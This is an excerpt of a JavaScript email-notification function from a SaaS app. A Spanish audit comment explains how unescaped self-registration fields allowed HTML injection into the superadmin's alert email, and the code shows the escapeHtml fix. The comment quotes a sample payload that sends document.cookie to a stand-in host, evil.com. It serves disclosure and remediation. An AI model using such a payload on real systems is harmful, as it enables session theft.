...
// HALLAZGO (auditoría etapa 6, superadmin): `empresa?.nombre` (y el resto
// de los campos de este template) vienen del formulario público de
// autoregistro (POST /api/registro, lib/handlers/registro.js) — ahí solo
// se valida que `empresa_nombre` no esté vacío (`.trim()`), sin ninguna
// restricción de caracteres. El trigger de la migración 548 dispara este
// endpoint con esos datos tal cual los cargó quien se registró, y
// avisarNuevoTenant() los interpolaba directo en el HTML del email sin
// escapar — cualquiera que se autoregistrara con un nombre de empresa
// como `<img src=x onerror=fetch('//evil.com/?c='+document.cookie)>`
// (o un `<a href="...">` de phishing) inyectaba HTML/atributos activos en
// el email que le llega al superadmin (SAAS_ALERTA_EMAIL). No hay ningún
// helper de escape de HTML en el proyecto (lib/email.js tampoco sanea);
// se agrega acá, local a este archivo, porque es el único template de
// email cuyo remitente NO es quien lo recibe (a diferencia del email de
// bienvenida al propio registrante, esto le llega al dueño de la
// plataforma con datos de un tercero no confiable) — el resto de los
// templates de lib/email.js (confirmación de pedido, etc.) quedan fuera
// del alcance de esta auditoría puntual pero tienen el mismo patrón y
// convendría revisarlos con el mismo criterio en una pasada aparte.
...
async function avisarNuevoTenant(empresa) {
  ...
  <body style="margin:0;padding:0;background:#F1EFE8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
    <div style="max-width:480px;margin:32px auto;background:#ffffff;border-radius:12px;overflow:hidden;border:1px solid #D3D1C7;">
      ...
      <div style="padding:24px 28px;font-size:14px;color:#2C2C2A;line-height:1.7;">
        <p style="margin:0 0 12px;"><strong>${escapeHtml(empresa?.nombre) || 'Sin nombre'}</strong></p>
        <p style="margin:0 0 4px;">Email: ${escapeHtml(empresa?.email) || '—'}</p>
        <p style="margin:0 0 4px;">CUIT: ${escapeHtml(empresa?.cuit) || '—'}</p>
        <p style="margin:0 0 4px;">Plan inicial: ${escapeHtml(empresa?.saas_plan) || 'trial'}</p>
  ...
  return enviarEmail({
    to: destino,
    subject: `Nuevo registro en Fluxo: ${(empresa?.nombre || 'empresa sin nombre').replace(/[\r\n]/g, ' ')}`,
    html,
  });
}
